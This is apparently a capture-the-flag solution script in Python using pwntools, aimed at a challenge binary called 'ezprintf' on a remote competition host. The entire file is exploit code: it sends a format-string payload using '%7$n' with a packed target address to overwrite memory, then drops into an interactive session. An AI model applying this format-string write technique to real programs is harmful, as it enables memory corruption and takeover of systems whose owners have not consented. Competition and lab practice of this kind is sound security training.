from pwn import *

if args.REMOTE:
    p = remote('challs.hats.sg', 1304)
else:
    p = process('ezprintf')

pause()
p.sendline('aaaa%7$n'+p64(0x0060106c))
p.interactive()
